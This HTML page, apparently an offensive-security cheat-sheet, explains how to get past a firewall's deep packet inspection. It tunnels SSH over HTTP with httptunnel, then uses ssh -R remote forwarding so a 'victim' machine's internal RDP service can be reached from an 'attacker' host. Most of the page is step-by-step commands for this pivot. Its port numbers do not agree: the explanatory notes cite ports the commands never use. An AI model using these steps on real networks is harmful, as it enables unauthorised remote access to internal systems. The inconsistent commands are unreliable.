<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Traffic Encapsulation</title>
</head><body><b><u>Traffic Encapsulation</u><br/>
<br/>
</b><b>Info:</b>&nbsp;<br/>
<br/>
When a deep packet inspection occurs on the network that do not allow any protocol out of the specified open ports in a firewall, an ecapsulation tool is required. <br/>
<br/>
<b>For a deep packet inspection that only allows HTTP out of the network: </b>An HTTP encaspulation tool such as http_tunnel can be used. <br/>
<b>For a deep packet inspection that only allows HTTPS out of the network: </b>An SSL encapsulation tool such as stunnel can be used. <br/>
<br/>
<br/>
<b>HTTP Encapsulation of SSH Remote Port Forwarding<u><br/>
</u><u><br/>
</u></b><b>Info:</b>&nbsp;Tunnel a remote port to a local server using SSH and encapsulate the traffic using HTTP<br/>
<br/>
<b>Program: </b>http_tunnel and<b>&nbsp;</b>SSH <br/>
<br/>
<b>Set Up:<br/>
<br/>
On Machine B set up the HTTP Tunnel server:<br/>
<br/>
</b>root@kali:~# hts -h<br/>
<br/>
root@kali-srv:~# hts -F localhost:22 53<br/>
<br/>
<b>Note</b>: This starts http tunneling server and forwards (-F) incoming connection on port 2139 to localhost:22<b><br/>
</b><b><br/>
<br/>
On Machine B run the ssh daemon on port 53:<br/>
<br/>
</b>root@kali:~# /etc/ssh/sshd_config<br/>
<br/>
# What ports, IPs and protocols we listen for<br/>
Port 22<br/>
<br/>
root@kali:~# /etc/init.d/ssh restart<br/>
<br/>
<br/>
<b><br/>
</b><b>On Machine A run the HTTP_client command:</b><br/>
<br/>
root@kali:~# htc -h<br/>
<br/>
root@kali-clt:~# htc -F 80 192.168.1.15:53<br/>
<br/>
<b>Note: </b>Run the http tunnel client and forward (-F) all incoming connection on port 8090 to 192.168.1.15:53<br/>
<br/>
<br/>
<b>On Machine A run the ssh command:</b><br/>
<br/>
ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;<br/>
<br/>
ssh a.b.c.d -R 3390:127.0.0.1:3389 -p 80<br/>
<br/>
<b>Note: </b><br/>
<br/>
Gateway&#09;&#09;&#09;&#09;=&#09;Machine B ip address<br/>
-R&#09;&#09;&#09;&#09;&#09;= &#09;Remote Port Forwarding<br/>
Remote Port To Bind&#09;= &#09;The port on Machine B that will be used to connect to Machine A's RDP service<br/>
Local host&#09;&#09;&#09;= &#09;the local ip address of Machine A<br/>
Local port &#09;&#09;&#09;= &#09;The port of Machine A to tunnel<br/>
-p&#09;&#09;&#09;&#09;&#09;= &#09;Port of Machine B SSH server (configured to go through the HTTP encapsulation)<br/>
<br/>
<br/>
<b>On Machine B run</b><br/>
<br/>
root@kali:~# rdesktop 127.0.0.1:3390<br/>
<br/>
<br/>
<b>Usage</b><br/>
<br/>
<b>Situation:</b>&nbsp;Machine A is an internal non-routeable machine in a corporate network with a Window's RDP service on port 3389. <br/>
<br/>
Victim's machine&#09;&#09;Attacker's Machine <br/>
<br/>
Machine A &lt;----------------&gt; Machine B<br/>
<br/>
Machine A &lt;-------------------&gt; a.b.c.d <br/>
<br/>
<br/>
<b>Machine B sets up HTTP tunnel server on port 53 that will forward all packets onto the SSH daemon on port 22</b><br/>
<b>Machine B sets up SSH daemon on port 22<br/>
</b><b>Machine A sets up HTTP tunnel client on port 80 that will forward all packets to machine B on port 53</b><br/>
<b>Machine A SSH connects to Machine B using port 80 (HTTP client tunnel port) which forwards the traffic onto the http tunnel server on Machine A which forward the packets onto the ssh server, which, using the remote port fowarding method, sets the gateway as Machine B, the remote port to bind as 3890, the local host as 127.0.0.1, and the local port to 3389 &nbsp;(RDP)</b><br/>
<b>Machine B RDP's to 127.0.0.1:3390 sending the traffic through the HTTP Tunnel, then through the SSH tunnel, then back out the HTTP Tunnel to Machine A, which sends the traffic to it's RDP service on port 3389. <br/>
<br/>
</b></body></html>